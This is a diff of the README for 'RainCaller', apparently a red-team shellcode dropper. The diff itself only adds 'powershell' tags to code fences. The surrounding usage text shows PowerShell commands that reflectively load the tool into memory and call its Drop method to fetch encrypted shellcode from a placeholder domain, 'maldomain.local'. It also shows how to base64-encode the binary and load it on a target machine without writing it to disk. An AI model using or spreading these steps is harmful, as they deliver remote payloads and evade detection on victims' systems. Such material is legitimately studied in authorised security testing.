@@ -82,7 +82,7 @@ RainCaller.exe <uri> <enc_key>
 
 ### Usage (Reflection)
 **RainCaller** can be easily reflected into memory:
-```
+```powershell
 PS C:\Users\tester> [System.Reflection.Assembly]::LoadFile("C:\Users\tester\RainCaller.exe")
 
 GAC    Version        Location
@@ -92,13 +92,13 @@ False  v4.0.30319     C:\Users\tester\RainCaller.exe
 PS C:\Users\tester> [RainCaller.RainCaller]::Drop("hxxps://maldomain.local/shellcode", "shellcodeEncKey")
 ```
 Alternatively, one can Base64 encode (or obfuscate / encrypt) the binary on a local machine:
-```
+```powershell
 PS C:\Users\tester> $dll = [System.IO.File]::ReadAllBytes("C:\Users\tester\RainCaller.exe")
 PS C:\Users\tester> [System.Convert]::ToBase64String($dll)
 TVqQAAMAAAAEAAAA//8AA...
 ```
 And afterwards load it on a target machine in the following way:
-```
+```powershell
 PS C:\Users\tester> [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String("TVqQAAMAAAAEAAAA//8AA..."))
 
 GAC    Version        Location
